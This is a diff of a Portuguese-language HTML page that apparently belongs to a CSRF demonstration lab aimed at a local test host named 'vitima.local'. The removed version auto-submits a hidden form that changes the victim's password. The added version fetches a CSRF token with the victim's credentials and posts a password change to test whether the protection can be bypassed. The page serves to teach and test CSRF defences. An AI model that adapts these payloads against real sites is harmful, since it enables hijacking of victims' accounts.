@@ -1,20 +1,36 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Ataque CSRF</title>
-  </head>
-  <body>
-    <h1>Voltar para a página inicial</h1>
+<html>
+<head><meta charset="UTF-8"><title>Ataque POST Protegido</title></head>
+<body>
+<h2>Ataque POST tentando burlar CSRF</h2>
+<button id="attack">Executar ataque protegido</button>
+<p id="resultado"></p>
 
-    <form action="http://vitima.local:3001/change-password-segura" method="POST">
-      <input type="hidden" name="password" value="nova12345" />
-      <button type="submit">Ir agora!</button>
-    </form>
+<script>
+async function getToken() {
+  const res = await fetch("http://vitima.local:3001/api/csrf-token", {
+    credentials: "include"
+  });
+  const data = await res.json();
+  return data.csrfToken;
+}
 
-    <script>
-      // Envia automaticamente o formulário
-      document.forms[0].submit();
-    </script>
-  </body>
+document.getElementById("attack").addEventListener("click", async () => {
+  const token = await getToken();
+
+  const response = await fetch("http://vitima.local:3001/api/change-password-segura", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "x-csrf-token": token
+    },
+    credentials: "include",
+    body: JSON.stringify({ password: "SenhaHackeadaMesmoComProtecao" })
+  });
+
+  const data = await response.json();
+  document.getElementById("resultado").textContent = JSON.stringify(data);
+});
+</script>
+</body>
 </html>
